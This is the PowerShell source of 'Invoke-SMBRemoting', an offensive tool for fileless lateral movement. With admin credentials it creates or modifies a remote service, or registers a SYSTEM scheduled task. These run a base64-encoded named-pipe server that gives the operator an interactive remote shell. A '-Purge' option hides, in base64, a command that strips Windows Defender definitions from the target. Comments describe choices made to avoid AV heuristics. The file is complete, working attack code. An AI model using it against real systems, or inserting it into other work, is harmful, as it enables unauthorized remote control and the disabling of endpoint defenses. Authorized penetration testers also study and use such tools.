function Invoke-SMBRemoting {

	<#

	.SYNOPSIS
	Invoke-SMBRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-SMBRemoting

	.DESCRIPTION
	Interactive Shell and Command Execution over Named-Pipes (SMB) for Fileless lateral movement.

	Everything stays in-memory: output is streamed over the named pipe, never written to disk.

	.REQUIREMENTS
	Admin rights over the target Host

	.PARAMETER ComputerName
	The Server HostName or IP to connect to

	.PARAMETER PipeName
	Specify the Pipe Name

	.PARAMETER ServiceName
	Specify the Service Name

	.PARAMETER Command
	Specify a command to run instead of getting a Shell

	.PARAMETER Timeout
	Specify a Timeout (in milliseconds) after which the script will stop waiting for a connection.
	Use -Timeout Infinite to wait indefinitely.

	.PARAMETER ModifyService
	Modify an existing service instead of creating a new one. If no target service is specified SensorService is targeted

	.PARAMETER AsTask
	Will create and run a task on remote target instead of a service

	.PARAMETER AsUser
	Run the task as the current user (via S4U logon: no password and no interactive
	logon required), instead of SYSTEM. The resulting shell runs commands locally
	only (S4U tokens have no network egress). Use without -AsUser for a SYSTEM shell.

	.PARAMETER IP
	Deprecated (kept for compatibility). No longer used.

	.PARAMETER Port
	Deprecated (kept for compatibility). No longer used.

	.PARAMETER Purge
	Purge AV definitions on target host

	.PARAMETER Verbose
	Show Pipe and Service Name info

	.PARAMETER NoColors
	Disable colored output

	.EXAMPLE
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -AsTask -AsUser
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -PipeName Something -ServiceName RandomService
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -Command "whoami /all"
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -ModifyService -Verbose
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -ModifyService -ServiceName SensorService -Verbose
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -ModifyService -Command "whoami /all"
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -Timeout Infinite
	Invoke-SMBRemoting -ComputerName MSSQL01.ferrari.local -Timeout 120000

	#>

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[object]$Timeout = 30000,
		[string]$IP,
		[int]$Port = 8080,
		[switch]$ModifyService,
		[switch]$Purge,
		[switch]$AsTask,
		[switch]$AsUser,
		[switch]$Verbose,
		[switch]$NoColors
	)

	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"

	# ------------------------------------------------------------------
	# State / flags (initialised up front so cleanup can always see them)
	# ------------------------------------------------------------------
	$MonitoringProcess = $null
	$pipeClient = $null
	$sw = $null
	$originalBinPath = $null
	$psrlAvailable = $false
	$tabHandlerInstalled = $false

	# ------------------------------------------------------------------
	# Helpers
	# ------------------------------------------------------------------
	function New-RandomString {
		param([int]$Length = 16)
		-join ((65..90) + (97..122) | Get-Random -Count $Length | ForEach-Object { [char]$_ })
	}

	function ConvertTo-SBRB64 {
		param([string]$Text)
		[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Text))
	}

	function Write-SBR {
		param([string]$Symbol, [string]$Text)
		$color = switch ($Symbol) {
			'+' { 'Green' }
			'-' { 'Red' }
			'!' { 'Yellow' }
			'i' { 'Cyan' }
			default { 'Gray' }
		}
		if ($NoColors) {
			Write-Host ("[{0}] {1}" -f $Symbol, $Text)
		}
		else {
			Write-Host ("[{0}] {1}" -f $Symbol, $Text) -ForegroundColor $color
		}
	}

	function Test-IncompleteInput {
		param([string]$Text)
		$t = $null
		$e = $null
		$null = [System.Management.Automation.Language.Parser]::ParseInput($Text, [ref]$t, [ref]$e)
		foreach ($err in $e) { if ($err.IncompleteInput) { return $true } }
		return $false
	}

	# Service create/change goes through sc.exe, which talks to the remote SCM
	# over the svcctl named pipe (SMB). The server script is kept small enough
	# that `cmd.exe /c powershell -enc <b64>` fits under cmd's 8191-char limit.
	function Invoke-Cleanup {
		# Close the pipes first so the server script sees EOF and exits cleanly
		# (its ReadLine returns null -> break), which stops the remote service
		# before we delete it. This avoids leaving an orphaned "pending delete"
		# service behind.
		if ($pipeClient) { try { $pipeClient.Close() } catch {}; try { $pipeClient.Dispose() } catch {} }
		Start-Sleep -Milliseconds 500

		# Restore any remote artifact we touched
		if ($AsTask) {
			if ($TaskName) { schtasks /delete /S $ComputerName /TN $TaskName /f | Out-Null }
		}
		elseif ($ModifyService -AND !$AsTask) {
			if ($ServiceName -and $originalBinPath) {
				Start-Process sc.exe -ArgumentList "\\$ComputerName stop $ServiceName" -WindowStyle Hidden
				Start-Process sc.exe -ArgumentList "\\$ComputerName config $ServiceName binpath= `"$originalBinPath`"" -WindowStyle Hidden
			}
		}
		else {
			if ($ServiceName) {
				Start-Process sc.exe -ArgumentList "\\$ComputerName delete $ServiceName" -WindowStyle Hidden
			}
		}

		if ($MonitoringProcess) { try { Stop-Process -Id $MonitoringProcess.Id -ErrorAction SilentlyContinue } catch {} }

		if ($tabHandlerInstalled) {
			Set-PSReadLineKeyHandler -Key Tab -Function TabCompleteNext
		}

		Remove-Variable __SBR -Scope Global -ErrorAction SilentlyContinue
	}

	# ------------------------------------------------------------------
	# Validation
	# ------------------------------------------------------------------
	if (-not $ComputerName) {
		Write-SBR '-' "Please specify a Target"
		Write-Output ""
		return
	}

	if (-not $PipeName) {
		$PipeName = New-RandomString
	}

	if (($ServiceName -AND $AsTask) -OR ($ModifyService -AND $AsTask)) {
		Write-SBR '-' "Running as Task or Service ? Please review your command"
		Write-Output ""
		return
	}

	if ($AsUser -AND !$AsTask) {
		Write-SBR '-' "Running -AsUser requires -AsTask. Please review your command"
		Write-Output ""
		return
	}

	if (!$ServiceName -AND !$ModifyService -AND !$AsTask) {
		$ServiceName = "Service_" + (New-RandomString)
	}
	elseif (!$ServiceName -AND $ModifyService -AND !$AsTask) {
		$ServiceName = "SensorService"
	}
	elseif ($AsTask) {
		$TaskName = "Task_" + (New-RandomString)
	}

	# ------------------------------------------------------------------
	# Admin access pre-check via the C$ admin share
	# ------------------------------------------------------------------
	$trigshare = '\\' + $ComputerName + '\c$'
	$Error.Clear()
	Get-ChildItem $trigshare | Out-Null
	if ($Error[0]) {
		if ($Error -match "Access is denied") {
			Write-SBR '-' "Access is denied"
		}
		else {
			Write-SBR '-' ($Error[0].Exception.Message)
		}
		Write-Output ""
		return
	}

	# ------------------------------------------------------------------
	# Purge: wipe AV definitions on the target
	# ------------------------------------------------------------------
	if ($Purge) {
		# & 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
		$purgeB64 = "JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA=="

		if ($AsTask) {
			if ($Verbose) { Write-SBR 'i' "Task Name: $TaskName"; Write-SBR 'i' "Creating Task on Remote Target..." }
			schtasks /create /S $ComputerName /SC Weekly /RU "NT Authority\SYSTEM" /TN $TaskName /TR "powershell.exe -enc $purgeB64" | Out-Null
			if ($Verbose) { Write-SBR 'i' "Task created on Remote Target" }
			Start-Sleep -Milliseconds 1000
			schtasks /Run /S $ComputerName /TN $TaskName | Out-Null
			if ($Verbose) { Write-SBR 'i' "Task started on Remote Target" }
			Start-Sleep -Milliseconds 3000
			schtasks /delete /S $ComputerName /TN $TaskName /f | Out-Null
			if ($Verbose) { Write-SBR 'i' "Task deleted on Remote Target" }
			Write-SBR '+' "Done"
			Write-Output ""
			return
		}
		else {
			if ($Verbose) { Write-SBR 'i' "Service Name: $ServiceName"; Write-SBR 'i' "Creating Service on Remote Target..." }
			$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $purgeB64`""
			$startarguments = "\\$ComputerName start $ServiceName"
			Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
			if ($Verbose) { Write-SBR 'i' "Service created" }
			Start-Sleep -Milliseconds 1000
			Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
			if ($Verbose) { Write-SBR 'i' "Service started" }
			Start-Sleep -Milliseconds 3000
			Start-Process sc.exe -ArgumentList "\\$ComputerName delete $ServiceName" -WindowStyle Hidden
			if ($Verbose) { Write-SBR 'i' "Service deleted" }
			Write-SBR '+' "Done"
			Write-Output ""
			return
		}
	}

	# ------------------------------------------------------------------
	# Pipe server script (runs on the target, fully in memory)
	#
	# Data pipe protocol:
	#   client -> server : EXEC <b64-unicode-command>
	#   client -> server : COMPLETE <b64-unicode-buffer> <cursor>
	#   client -> server : exit
	#   server -> client : streamed output lines ... then ###END###
	#   server -> client (COMPLETE): <ReplacementIndex> / <ReplacementLength> / matches... / ###END###
	#
	# Control pipe protocol (<PipeName>_ctrl):
	#   client -> server : ###INTERRUPT###   (stop the running command)
	#   client -> server : exit
	# ------------------------------------------------------------------
	$ServerScript = @'
$n="__PIPE_NAME__"
$d=New-Object IO.Pipes.NamedPipeServerStream($n,"InOut",1,"Byte","None",4096,4096,$null)
$t=New-Object Threading.Timer({param($s)try{$s.Close()}catch{}},$d,600000,[Threading.Timeout]::Infinite)
$d.WaitForConnection()
$null=$t.Change([Threading.Timeout]::Infinite,[Threading.Timeout]::Infinite)
$t.Dispose()
$sr=New-Object IO.StreamReader($d)
$sw=New-Object IO.StreamWriter($d)
$sw.AutoFlush=$true
while($true){
if(-not$d.IsConnected){break}
$l=$sr.ReadLine()
if($null-eq$l){break}
if($l-eq"exit"){break}
if($l.StartsWith("COMPLETE ")){
$rest=$l.Substring(9)
$sp=$rest.IndexOf(" ")
$b64=$rest.Substring(0,$sp)
$cur=[int]$rest.Substring($sp+1)
$buf=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
$cc=[Management.Automation.CommandCompletion]::CompleteInput($buf,$cur,$null)
$sw.WriteLine([string]$cc.ReplacementIndex)
$sw.WriteLine([string]$cc.ReplacementLength)
foreach($m in $cc.CompletionMatches){$sw.WriteLine($m.CompletionText)}
$sw.WriteLine("###END###")
$sw.Flush()
continue
}
$cmd=$l
if($l.StartsWith("EXEC ")){$a=$l.Split(" ");$cmd=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($a[1]));$w=[int]$a[2]}
Invoke-Expression (". { "+$cmd+" } *>&1") | %{
if($_-is[Management.Automation.ErrorRecord]){($_|Out-String).TrimEnd()-split"`n"|%{"E|"+$_.TrimEnd()}}
elseif($_-is[Management.Automation.InformationRecord]){$m=$_.MessageData;"C:"+$m.ForegroundColor+"|"+$m.Message}
else{$_}
} | Out-String -Stream -Width $w | %{$sw.WriteLine($_)}
$sw.WriteLine("###END###")
$sw.Flush()
}
try{$d.Disconnect()}catch{}
try{$d.Dispose()}catch{}
'@

	$ServerScript = $ServerScript.Replace('__PIPE_NAME__', $PipeName)
	$B64ServerScript = ConvertTo-SBRB64 $ServerScript

	# The service binpath is set via WMI (Win32_Service), which has no
	# command-line length limit, so the plain base64 script is shipped directly
	# (no compression -> avoids AV heuristics).

	# ------------------------------------------------------------------
	# Deploy: scheduled task (AsTask), modified service, or new service
	# ------------------------------------------------------------------
		if ($AsTask) {
		if ($Verbose) {
			Write-SBR 'i' "Pipe Name: $PipeName"
			Write-SBR 'i' "Task Name: $TaskName"
			Write-SBR 'i' "Creating Task on Remote Target..."
		}

		# Register via the Task Scheduler COM API (no /TR length limit), embedding
		# the base64 server script directly. SYSTEM runs as a service account;
		# -AsUser uses S4U (runs as the current user, no password, no interactive
		# logon required).
		$sched = New-Object -ComObject Schedule.Service
		$sched.Connect($ComputerName)
		$folder = $sched.GetFolder("\")
		$def = $sched.NewTask(0)
		$def.Principal.RunLevel = 1
		if ($AsUser) {
			$def.Principal.LogonType = 2   # TASK_LOGON_S4U
			$def.Principal.UserId = "$($env:USERDOMAIN)\$($env:USERNAME)"
			$taskLogonType = 2
		}
		else {
			$def.Principal.LogonType = 5   # TASK_LOGON_SERVICE_ACCOUNT (SYSTEM)
			$def.Principal.UserId = "SYSTEM"
			$taskLogonType = 5
		}
		$act = $def.Actions.Create(0)
		$act.Path = "powershell.exe"
		$act.Arguments = "-NoProfile -ExecutionPolicy Bypass -enc $B64ServerScript"
		$null = $folder.RegisterTaskDefinition($TaskName, $def, 6, $null, $null, $taskLogonType, $null)

		if ($Verbose) { Write-SBR 'i' "Task created on Remote Target" }

		schtasks /Run /S $ComputerName /TN $TaskName | Out-Null

		if ($Verbose) { Write-SBR 'i' "Task started on Remote Target" }
	}
	elseif ($ModifyService) {
		$originalBinPath = & sc.exe \\$ComputerName qc $ServiceName | Select-String "BINARY_PATH_NAME" | ForEach-Object { $_.ToString().Split(":", 2)[1].Trim() }

		if ($Verbose) {
			Write-SBR 'i' "Pipe Name: $PipeName"
			Write-SBR 'i' "Service Name: $ServiceName"
			Write-SBR 'i' "Original binPath: $originalBinPath"
			Write-SBR 'i' "Modifying Service on Remote Target..."
			Write-Output ""
		}

		$newBinPath = "C:\Windows\System32\cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -enc $B64ServerScript"
		$arguments = "\\$ComputerName config $ServiceName binpath= `"$newBinPath`""
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		Start-Process sc.exe -ArgumentList "\\$ComputerName stop $ServiceName" -WindowStyle Hidden
		Start-Sleep -Milliseconds 1000
		Start-Process sc.exe -ArgumentList "\\$ComputerName start $ServiceName" -WindowStyle Hidden
	}

	else {
		if ($Verbose) {
			Write-SBR 'i' "Pipe Name: $PipeName"
			Write-SBR 'i' "Service Name: $ServiceName"
			Write-SBR 'i' "Creating Service on Remote Target..."
			Write-Output ""
		}

		$binPath = "C:\Windows\System32\cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -enc $B64ServerScript"
		$arguments = "\\$ComputerName create $ServiceName binpath= `"$binPath`""
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		Start-Sleep -Milliseconds 1000
		Start-Process sc.exe -ArgumentList "\\$ComputerName start $ServiceName" -WindowStyle Hidden
	}

	# ------------------------------------------------------------------
	# Cleanup watchdog (background): cleans up the service/task when we die
	# ------------------------------------------------------------------
	$currentPID = $PID

	if ($AsTask) {
		$monitoringScript = @"
`$TargetServer = "__TARGET__"
`$TargetTask = "__TASK__"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }
	if (-not `$process) {
		schtasks /delete /S `$TargetServer /TN `$TargetTask /f
		break
	}
}
"@
		$monitoringScript = $monitoringScript.Replace('__TARGET__', $ComputerName).Replace('__TASK__', $TaskName)
	}
	elseif ($ModifyService -AND !$AsTask) {
		$monitoringScript = @"
`$serviceToDelete = "__SERVICE__"
`$TargetServer = "__TARGET__"
`$primaryScriptProcessId = $currentPID
`$BinPath = "__BINPATH__"

while (`$true) {
	Start-Sleep -Seconds 5
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }
	if (-not `$process) {
		Start-Process sc.exe -ArgumentList "\\`$TargetServer stop `$serviceToDelete" -WindowStyle Hidden
		Start-Process sc.exe -ArgumentList "\\`$TargetServer config `$serviceToDelete binpath= `$BinPath" -WindowStyle Hidden
		break
	}
}
"@
		$monitoringScript = $monitoringScript.Replace('__SERVICE__', $ServiceName).Replace('__TARGET__', $ComputerName).Replace('__BINPATH__', $originalBinPath)
	}
	else {
		$monitoringScript = @"
`$serviceToDelete = "__SERVICE__"
`$TargetServer = "__TARGET__"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }
	if (-not `$process) {
		Start-Process sc.exe -ArgumentList "\\`$TargetServer delete `$serviceToDelete" -WindowStyle Hidden
		break
	}
}
"@
		$monitoringScript = $monitoringScript.Replace('__SERVICE__', $ServiceName).Replace('__TARGET__', $ComputerName)
	}

	$b64monitoringScript = ConvertTo-SBRB64 $monitoringScript
	$MonitoringProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden -PassThru

	# ------------------------------------------------------------------
	# Connect to the target pipe(s)
	# ------------------------------------------------------------------
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')

	try {
		if ($Timeout -is [string] -and $Timeout -eq "Infinite") {
			$pipeClient.Connect()
		}
		else {
			$pipeClient.Connect([int]$Timeout)
		}
	}
	catch [System.TimeoutException] {
		Write-SBR '-' "[$($ComputerName)]: Connection timed out | Try again with a larger -Timeout or -Timeout Infinite"
		Write-Output ""
		Invoke-Cleanup
		return
	}
	catch {
		Write-SBR '-' "[$($ComputerName)]: An unexpected error occurred: $($_.Exception.Message)"
		Write-Output ""
		Invoke-Cleanup
		return
	}

	$sw = New-Object System.IO.StreamWriter($pipeClient)
	$sw.AutoFlush = $true

	# ------------------------------------------------------------------
	# Interactive state (in-memory pipe reader/writer, shared with tab handler)
	# ------------------------------------------------------------------
	$global:__SBR = [pscustomobject]@{
		Pipe    = $pipeClient
		Writer  = $sw
		Decoder = [System.Text.Encoding]::UTF8.GetDecoder()
		CharBuf = New-Object char[] 4096
		ByteBuf = New-Object byte[] 4096
		Buffer  = New-Object System.Text.StringBuilder
		CompMatches = $null
		CompIndex   = 0
		CompBuffer  = $null
		NoColors    = $NoColors
		MultiLine   = ""
	}

	Add-Member -InputObject $global:__SBR -MemberType ScriptMethod -Name Width -Value {
		try {
			$w = $Host.UI.RawUI.WindowSize.Width
			if ($w -lt 40) { return 120 }
			return $w
		}
		catch { return 120 }
	}

	Add-Member -InputObject $global:__SBR -MemberType ScriptMethod -Name ReadLine -Value {
		$s = $this
		while ($true) {
			$buf = $s.Buffer.ToString()
			$nl = $buf.IndexOf("`n")
			if ($nl -ge 0) {
				$line = $buf.Substring(0, $nl).TrimEnd("`r")
				$null = $s.Buffer.Remove(0, $nl + 1)
				return $line
			}
			$n = $s.Pipe.Read($s.ByteBuf, 0, $s.ByteBuf.Length)
			if ($n -le 0) { return $null }
			$ch = $s.Decoder.GetChars($s.ByteBuf, 0, $n, $s.CharBuf, 0)
			$null = $s.Buffer.Append($s.CharBuf, 0, $ch)
		}
	}

	Add-Member -InputObject $global:__SBR -MemberType ScriptMethod -Name FetchCwd -Value {
		$s = $this
		$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("(Get-Location).Path"))
		$s.Writer.WriteLine("EXEC $b64 $($s.Width())")
		$s.Writer.Flush()
		$result = ""
		while ($true) {
			$line = $s.ReadLine()
			if ($null -eq $line) { break }
			if ($line -eq "###END###") { break }
			$result += $line
		}
		return $result
	}

	Add-Member -InputObject $global:__SBR -MemberType ScriptMethod -Name ExecStream -Value {
		param([string]$Command)
		$s = $this
		$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
		$s.Writer.WriteLine("EXEC $b64 $($s.Width())")
		$s.Writer.Flush()

		while ($true) {
			$line = $s.ReadLine()
			if ($null -eq $line) { break }
			if ($line -eq "###END###") { break }
			if ($line.StartsWith("E|")) {
				if ($s.NoColors) { Write-Host $line.Substring(2) } else { Write-Host $line.Substring(2) -ForegroundColor Red }
			}
			elseif ($line.StartsWith("C:")) {
				$pi = $line.IndexOf("|")
				if ($pi -ge 0) {
					$col = $line.Substring(2, $pi - 2)
					$txt = $line.Substring($pi + 1)
					if ($col -and -not $s.NoColors) { Write-Host $txt -ForegroundColor $col }
					else { Write-Host $txt }
				}
				else { Write-Host $line }
			}
			else { Write-Host $line }
		}
	}

	# ------------------------------------------------------------------
	# Tab completion via PSReadLine (remote completion over the pipe)
	# ------------------------------------------------------------------
	if (Get-Module -ListAvailable PSReadLine) {
		try {
			Import-Module PSReadLine -ErrorAction Stop
			$psrlAvailable = $true
		}
		catch { $psrlAvailable = $false }
	}

	if ($psrlAvailable) {
		Set-PSReadLineKeyHandler -Key Tab -ScriptBlock {
			param($key, $arg)
			$s = $global:__SBR
			$line = $null
			$cursor = 0
			[Microsoft.PowerShell.PSConsoleReadLine]::GetBufferState([ref]$line, [ref]$cursor)

			$prefix = if ($s.MultiLine) { $s.MultiLine + "`n" } else { "" }
			$full = $prefix + $line
			$fullCursor = $prefix.Length + $cursor

			if ([string]::IsNullOrWhiteSpace($full)) { return }

			if ($s.CompMatches -and $s.CompBuffer -eq $full) {
				$s.CompIndex = $s.CompIndex + 1
				if ($s.CompIndex -ge $s.CompMatches.Count) { $s.CompIndex = 0 }
			}
			else {
				$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($full))
				$s.Writer.WriteLine("COMPLETE $b64 $fullCursor")
				$s.Writer.Flush()

				$ri = [int]($s.ReadLine())
				$rl = [int]($s.ReadLine())
				$matches = @()
				while ($true) {
					$m = $s.ReadLine()
					if ($null -eq $m -or $m -eq "###END###") { break }
					$matches += $m
				}
				$s.CompMatches = @($matches | ForEach-Object { [pscustomobject]@{ Text = $_; Ri = $ri; Rl = $rl } })
				$s.CompIndex = 0
				$s.CompBuffer = $full
			}

			if ($s.CompMatches -and $s.CompMatches.Count -gt 0) {
				$m = $s.CompMatches[$s.CompIndex]
				$localRi = $m.Ri - $prefix.Length
				if ($localRi -lt 0) { return }
				[Microsoft.PowerShell.PSConsoleReadLine]::Delete($localRi, $m.Rl)
				[Microsoft.PowerShell.PSConsoleReadLine]::SetCursorPosition($localRi)
				[Microsoft.PowerShell.PSConsoleReadLine]::Insert($m.Text)
			}
		}
		$tabHandlerInstalled = $true
	}

	# ------------------------------------------------------------------
	# One-shot command mode
	# ------------------------------------------------------------------
	if ($Command) {
		$b64cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
		$sw.WriteLine("EXEC $b64cmd $($global:__SBR.Width())")
		$sw.Flush()

		$out = @()
		while ($true) {
			$line = $global:__SBR.ReadLine()
			if ($null -eq $line) { break }
			if ($line -eq "###END###") { break }
			if ($line.StartsWith("E|")) { $out += $line.Substring(2) }
			elseif ($line.StartsWith("C:")) {
				$pi = $line.IndexOf("|")
				if ($pi -ge 0) { $out += $line.Substring($pi + 1) } else { $out += $line }
			}
			else { $out += $line }
		}
		Write-Output ($out -join "`n")
		Write-Output ""

		# cleanly signal the server to exit so the service stops (reliable delete)
		$sw.WriteLine("exit")
		$sw.Flush()

		Invoke-Cleanup
		return
	}

	# ------------------------------------------------------------------
	# Interactive shell
	# ------------------------------------------------------------------
	$ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
	if ($ComputerName -match $ipPattern) { $computerNameOnly = $ComputerName }
	else { $computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1 }

	while ($true) {
		# fetch remote cwd for the prompt
		$cwd = $global:__SBR.FetchCwd()
		if ($null -eq $cwd -or $cwd -eq "") { break }

		# plain prompt (no color, like a normal PowerShell prompt)
		Write-Host -NoNewline ("[{0}]: {1}> " -f $computerNameOnly, $cwd)

		# read input (PSReadLine with tab completion, else plain Read-Host)
		if ($psrlAvailable) {
			try {
				$userCommand = [Microsoft.PowerShell.PSConsoleReadLine]::ReadLine($Host.Runspace, $ExecutionContext)
			}
			catch {
				$userCommand = Read-Host
			}
		}
		else {
			$userCommand = Read-Host
		}

		if ($null -eq $userCommand) { break }

		if ($userCommand -eq "exit") {
			$sw.WriteLine("exit")
			$sw.Flush()
			break
		}

		if ($userCommand.Trim() -eq "") { continue }

		# multi-line accumulation: keep reading lines while the statement is
		# syntactically incomplete (e.g. an open block, here-string, or pipeline)
		$buffer = $userCommand
		$global:__SBR.MultiLine = ""
		while (Test-IncompleteInput $buffer) {
			$global:__SBR.MultiLine = $buffer
			Write-Host -NoNewline ">> "
			if ($psrlAvailable) {
				try { $line = [Microsoft.PowerShell.PSConsoleReadLine]::ReadLine($Host.Runspace, $ExecutionContext) }
				catch { $line = Read-Host }
			}
			else { $line = Read-Host }
			if ($null -eq $line) { break }
			$buffer += "`n" + $line
		}
		$global:__SBR.MultiLine = ""

		$global:__SBR.ExecStream($buffer)
	}

	Invoke-Cleanup
}
